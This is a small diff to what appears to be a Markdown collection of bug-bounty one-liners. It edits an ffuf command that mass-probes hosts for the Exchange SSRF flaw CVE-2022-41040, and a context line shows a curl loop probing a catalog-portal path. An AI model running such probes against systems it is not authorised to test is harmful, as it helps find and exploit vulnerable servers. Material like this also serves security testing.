@@ -587,7 +587,7 @@ cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/u
 ```
 ### CVE-2022-41040:
 ```
-ffuf -w "urls.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
+ffuf -w "urls.txt:URL" -u "URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
 ```
 ---------
 ## RCE:
